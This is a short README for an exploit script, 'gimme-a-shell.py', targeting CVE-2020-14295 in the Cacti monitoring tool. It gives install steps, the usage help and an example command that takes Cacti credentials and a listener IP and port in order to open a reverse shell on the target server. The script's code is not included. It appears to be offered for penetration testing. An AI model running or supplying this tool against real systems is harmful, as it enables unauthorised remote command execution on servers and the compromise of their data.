# CVE-2020-14295
***
Vulnerability details - https://github.com/Cacti/cacti/issues/3622

## Install
`pip3 install -r requirements.txt`

## Usage 
```
$ ./gimme-a-shell.py --help
usage: gimme-a-shell.py [-h] -t Target -U Username -P Password -i Shell-IP -p Shell-Port

optional arguments:
  -h, --help     show this help message and exit

required arguments:
  -t Target      Target URL
  -U Username    Cacti username
  -P Password    Cacti password
  -i Shell-IP    Reverse-Shell IP
  -p Shell-Port  Reverse-Shell Port
```
## Example 
`./gimme-a-shell.py -t http://cacti.localhost -U admin -P admin -i 127.0.0.1 -p 9001`